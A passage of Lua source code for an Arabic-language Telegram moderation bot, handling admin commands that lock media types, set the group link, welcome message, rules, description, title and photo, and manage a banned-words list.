return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Unsupported"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل السيلفي").lockKick,"md",true)  
return false
end 
if text == "فتح السيلفي" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Unsupported"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح السيلفي").unLock,"md",true)  
return false
end 
if text == "قفل الماركداون" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Markdaun"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الماركداون").Lock,"md",true)  
return false
end 
if text == "قفل الماركداون بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Markdaun"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الماركداون").lockKid,"md",true)  
return false
end 
if text == "قفل الماركداون بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Markdaun"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الماركداون").lockKtm,"md",true)  
return false
end 
if text == "قفل الماركداون بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Markdaun"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الماركداون").lockKick,"md",true)  
return false
end 
if text == "فتح الماركداون" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Markdaun"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الماركداون").unLock,"md",true)  
return false
end 
if text == "قفل الجهات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Contact"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الجهات").Lock,"md",true)  
return false
end 
if text == "قفل الجهات بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Contact"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الجهات").lockKid,"md",true)  
return false
end 
if text == "قفل الجهات بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Contact"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الجهات").lockKtm,"md",true)  
return false
end 
if text == "قفل الجهات بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Contact"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الجهات").lockKick,"md",true)  
return false
end 
if text == "فتح الجهات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Contact"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الجهات").unLock,"md",true)  
return false
end 
if text == "قفل الكلايش" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Spam"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكلايش").Lock,"md",true)  
return false
end 
if text == "قفل الكلايش بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Spam"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكلايش").lockKid,"md",true)  
return false
end 
if text == "قفل الكلايش بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Spam"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكلايش").lockKtm,"md",true)  
return false
end 
if text == "قفل الكلايش بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Spam"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الكلايش").lockKick,"md",true)  
return false
end 
if text == "فتح الكلايش" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Spam"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الكلايش").unLock,"md",true)  
return false
end 
if text == "قفل الانلاين" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Inlen"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الانلاين").Lock,"md",true)  
return false
end 
if text == "قفل الانلاين بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Inlen"..msg_chat_id,"ked")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الانلاين").lockKid,"md",true)  
return false
end 
if text == "قفل الانلاين بالكتم" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Inlen"..msg_chat_id,"ktm")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الانلاين").lockKtm,"md",true)  
return false
end 
if text == "قفل الانلاين بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:Inlen"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الانلاين").lockKick,"md",true)  
return false
end 
if text == "فتح الانلاين" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Lock:Inlen"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الانلاين").unLock,"md",true)  
return false
end 
if text == "ضع رابط" or text == "وضع رابط" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Set:Link"..msg_chat_id..""..msg.sender.user_id,120,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل رابط الكروب او رابط قناة الكروب","md",true)  
end
if text == "مسح الرابط" or text == "حذف الرابط" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Group:Link"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم مسح الرابط ","md",true)             
end
if text == "الرابط" then
if not Redis:get(LaRiCa.."Status:Link"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل جلب الرابط من قبل الادمنيه","md",true)
end 
local Get_Chat = LuaTele.getChat(msg_chat_id)
local GetLink = Redis:get(LaRiCa.."Group:Link"..msg_chat_id) 
if GetLink then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text =Get_Chat.title, url = GetLink}, },}}
return LuaTele.sendText(msg_chat_id, msg_id, "• Link Group : \n["..Get_Chat.title.. ']('..GetLink..')', 'md', true, false, false, false, reply_markup)
else 
local LinkGroup = LuaTele.generateChatInviteLink(msg_chat_id,'Hussain',tonumber(msg.date+86400),0,true)
if LinkGroup.code == 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا استطيع جلب الرابط بسبب ليس لدي صلاحيه دعوه مستخدمين من خلال الرابط ","md",true)
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = Get_Chat.title, url = LinkGroup.invite_link},},}}
return LuaTele.sendText(msg_chat_id, msg_id, "• Link Group : \n["..Get_Chat.title.. ']('..LinkGroup.invite_link..')', 'md', true, false, false, false, reply_markup)
end
end

if text == "ضع ترحيب" or text == "وضع ترحيب" then  
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Tshake:Welcome:Group" .. msg_chat_id .. "" .. msg.sender.user_id, 120, true)  
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي الترحيب الان".."\n• تستطيع اضافة مايلي !\n• دالة عرض الاسم »{`name`}\n• دالة عرض المعرف »{`user`}\n• دالة عرض اسم الكروب »{`NameCh`}","md",true)   
end
if text == "الترحيب" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:get(LaRiCa.."Status:Welcome"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الترحيب من قبل الادمنيه","md",true)
end 
local Welcome = Redis:get(LaRiCa.."Welcome:Group"..msg_chat_id)
if Welcome then 
return LuaTele.sendText(msg_chat_id,msg_id,Welcome,"md",true)   
else 
return LuaTele.sendText(msg_chat_id,msg_id,"• لم يتم تعيين ترحيب للكروب","md",true)   
end 
end
if text == "مسح الترحيب" or text == "حذف الترحيب" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Welcome:Group"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم ازالة ترحيب الكروب","md",true)   
end
if text == "ضع قوانين" or text == "وضع قوانين" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Set:Rules:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي القوانين الان","md",true)  
end
if text == "مسح القوانين" or text == "حذف القوانين" then  
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Group:Rules"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم ازالة قوانين الكروب","md",true)    
end
if text == "القوانين" then 
local Rules = Redis:get(LaRiCa.."Group:Rules" .. msg_chat_id)   
if Rules then     
return LuaTele.sendText(msg_chat_id,msg_id,Rules,"md",true)     
else      
return LuaTele.sendText(msg_chat_id,msg_id,"• لا توجد قوانين هنا","md",true)     
end    
end
if text == "ضع وصف" or text == "وضع وصف" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).Info == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
Redis:setex(LaRiCa.."Set:Description:" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي وصف الكروب الان","md",true)  
end
if text == "مسح الوصف" or text == "حذف الوصف" then  
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).Info == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
LuaTele.setChatDescription(msg_chat_id, '') 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم ازالة قوانين الكروب","md",true)    
end

if text and text:match("^ضع اسم (.*)") or text and text:match("^وضع اسم (.*)") then 
local NameChat = text:match("^ضع اسم (.*)") or text:match("^وضع اسم (.*)") 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).Info == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
LuaTele.setChatTitle(msg_chat_id,NameChat)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير اسم الكروب الى : "..NameChat,"md",true)    
end

if text == ("ضع صوره") then  
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Info == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه تغيير المعلومات* ',"md",true)  
end
Redis:set(LaRiCa.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل الصوره لوضعها","md",true)    
end

if text == "مسح قائمه المنع" then   
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."List:Filter"..msg_chat_id)  
if #list == 0 then  
return LuaTele.sendText(msg_chat_id,msg_id,"*• لا يوجد كلمات ممنوعه هنا*","md",true)   
end  
for k,v in pairs(list) do  
v = v:gsub('photo:',"") 
v = v:gsub('sticker:',"") 
v = v:gsub('animation:',"") 
v = v:gsub('text:',"") 
Redis:del(LaRiCa.."Filter:Group:"..v..msg_chat_id)  
Redis:srem(LaRiCa.."List:Filter"..msg_chat_id,v)  
end  
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح ("..#list..") كلمات ممنوعه*","md",true)   
end
if text == "قائمه المنع" then   
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."List:Filter"..msg_chat_id)  
if #list == 0 then  
